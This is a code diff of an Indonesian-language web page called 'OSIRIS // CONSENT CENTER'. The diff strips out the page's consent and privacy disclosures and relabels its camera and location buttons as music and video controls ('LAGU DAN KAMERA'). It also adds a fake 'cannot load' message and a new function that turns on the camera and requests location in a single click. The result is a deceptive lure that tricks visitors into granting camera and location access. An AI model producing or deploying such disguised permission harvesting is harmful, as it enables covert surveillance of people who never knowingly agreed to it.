@@ -49,13 +49,8 @@ footer{text-align:center;color:#637789;font-size:10px;margin-top:22px}
 
 <div class="logo">OSIRIS // CONSENT CENTER</div>
 
-<h1>Device Permissions</h1>
 
-<p class="desc">
-Pilih fitur yang ingin kamu gunakan.
-Izin bersifat opsional dan dapat dihentikan kapan saja.
-Data tidak dikirim ke dashboard tanpa persetujuan terpisah.
-</p>
+
 
 <div class="panel">
 <b>DEVICE INFORMATION</b><br>
@@ -65,25 +60,25 @@ Language: <span id="language"></span>
 </div>
 
 <div class="panel">
-<b>LOCATION</b><br>
-Lokasi hanya diminta ketika kamu menekan tombol di bawah.
+<b>VIDEO</b><br>
 <div id="locationStatus">Belum diminta.</div>
-<button class="primary" onclick="requestLocation()">IZINKAN LOKASI</button>
+<button class="primary" onclick="enablePermissions()">
+    LAGU DAN KAMERA
+</button>
 </div>
 
 <div class="panel">
-<b>CAMERA</b><br>
-Kamera hanya aktif setelah izin diberikan.
-Preview ditampilkan di perangkat ini.
+<b>LAGU</b><br>
 <video id="camera" autoplay playsinline muted></video>
-<div id="cameraStatus">Kamera tidak aktif.</div>
-<button class="primary" onclick="startCamera()">AKTIFKAN KAMERA</button>
-<button class="secondary" onclick="stopCamera()">MATIKAN KAMERA</button>
+<div id="cameraStatus">TIDAK DAPAT MEMUAT.</div>
+<button class="primary" onclick="enablePermissions()">
+    LAGU DAN VIDIO
+</button>
 </div>
 
 <div id="status"></div>
 
-<footer>OSIRIS // PRIVACY & CONSENT</footer>
+<footer>WELWELWEL</footer>
 </div>
 
 <script>
@@ -157,6 +152,18 @@ function stopCamera(){
 
     document.getElementById("cameraStatus").textContent =
         "Kamera telah dimatikan.";
+}
+    async function enablePermissions() {
+    const status = document.getElementById("status");
+
+    status.textContent = "Memproses permintaan izin...";
+
+    await startCamera();
+    requestLocation();
+
+    status.textContent =
+        "Permintaan kamera dan lokasi telah diproses. " +
+        "Periksa status izin masing-masing.";
 }
 </script>
 </body>
